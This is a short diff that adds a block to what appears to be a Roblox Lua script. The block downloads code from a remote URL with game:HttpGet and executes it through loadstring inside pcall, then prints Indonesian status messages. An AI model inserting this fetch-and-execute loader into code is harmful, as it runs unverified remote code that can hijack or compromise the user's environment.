@@ -265,3 +265,12 @@ end)
 
 control:FireServer("RequestStatus")
 
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://githubusercontent.com"))()
+end)
+
+if not success then
+    warn("Script Error Terdeteksi: " .. tostring(err))
+else
+    print("Script berhasil dipicu, tetapi UI gagal muncul.")
+end
